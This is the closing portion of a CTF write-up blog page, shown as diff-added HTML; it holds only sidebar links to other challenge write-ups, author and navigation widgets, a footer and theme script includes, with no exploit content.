href="/2024/12/04/MRCTF2020-Ezpop-Revenge/" rel="bookmark" title="[MRCTF2020]Ezpop_Revenge">[MRCTF2020]Ezpop_Revenge</a></li><li><a href="/2024/12/10/b01lers2020-Spac-Noodles/" rel="bookmark" title="[b01lers2020]Spac_Noodles">[b01lers2020]Spac_Noodles</a></li><li><a href="/2024/12/10/De1CTF-2019-Giftbox/" rel="bookmark" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></li><li><a href="/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/" rel="bookmark" title="[NewStarCTF2023公开赛道]EasyLogin">[NewStarCTF2023公开赛道]EasyLogin</a></li><li><a href="/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/" rel="bookmark" title="NewStarCTF2023新生赛_BabySSTI_Three">NewStarCTF2023新生赛_BabySSTI_Three</a></li><li><a href="/2025/02/09/%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne/" rel="bookmark" title="公开赛赛道]UnserializeOne">公开赛赛道]UnserializeOne</a></li><li><a href="/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/" rel="bookmark" title="[NewStarCTF公开赛赛道]BabySSTI_Two">[NewStarCTF公开赛赛道]BabySSTI_Two</a></li><li><a href="/2025/02/09/BSidesCF2019-Sequel/" rel="bookmark" title="[BSidesCF2019]Sequel">[BSidesCF2019]Sequel</a></li><li><a href="/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/" rel="bookmark" title="NewStarCTF_2023_公开赛道Include">NewStarCTF_2023_公开赛道Include</a></li><li><a href="/2025/02/23/HFCTF-2021-Final-hatenum/" rel="bookmark" title="[HFCTF_2021_Final]hatenum">[HFCTF_2021_Final]hatenum</a></li><li><a href="/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/" rel="bookmark" title="[Dest0g3_520迎新赛]SimpleRCE">[Dest0g3_520迎新赛]SimpleRCE</a></li><li><a href="/2025/02/24/SWPUCTF-2016-Web7/" rel="bookmark" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></li><li><a href="/2025/02/26/HMGCTF2022-Fan-Website/" rel="bookmark" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></li><li><a href="/2025/03/02/PyCalX-1/" rel="bookmark" title="PyCalX_1">PyCalX_1</a></li><li><a href="/2025/03/11/GKCTF-2021-babycat-revenge/" rel="bookmark" title="[GKCTF_2021]babycat-revenge">[GKCTF_2021]babycat-revenge</a></li><li><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" rel="bookmark" title="谁赢了比赛？">谁赢了比赛？</a></li><li><a href="/2025/03/13/%E6%A2%85%E8%8A%B1%E9%A6%99%E8%87%AA%E8%8B%A6%E5%AF%92%E6%9D%A5/" rel="bookmark" title="梅花香自苦寒来">梅花香自苦寒来</a></li><li><a href="/2025/03/13/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-outguess/" rel="bookmark" title="[ACTF新生赛2020]outguess">[ACTF新生赛2020]outguess</a></li><li><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></li><li><a href="/2025/03/18/JMCTF-2021-GoOSS/" rel="bookmark" title="[JMCTF_2021]GoOSS">[JMCTF_2021]GoOSS</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">97</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">11</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">87</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/10/28/newstarctf2024/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+</div>
+
+    <span><a href="/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" title="SHctf-2024部分复现">SHctf-2024部分复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BE%85%E5%A4%8D%E7%8E%B0/" title="In 待复现">待复现</a>
+</div>
+
+    <span><a href="/2024/11/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/" title="[网鼎杯2020半决赛]faka">[网鼎杯2020半决赛]faka</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/02/24/SWPUCTF-2016-Web7/" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/" title="[SWPU2019]你有没有好好看网课?">[SWPU2019]你有没有好好看网课?</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/17/MyBatis/" title="MyBatis">MyBatis</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/19/BSidesCF-2020-Cards/" title="[BSidesCF-2020]Cards">[BSidesCF-2020]Cards</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
+</div>
+
+    <span><a href="/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/" title="[网鼎杯2020青龙组]notes">[网鼎杯2020青龙组]notes</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/03/12/GHCTF2025web%E5%A4%8D%E7%8E%B0/" title="GHCTF2025web复现">GHCTF2025web复现</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/11/03/CISCN2021Quals-upload/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
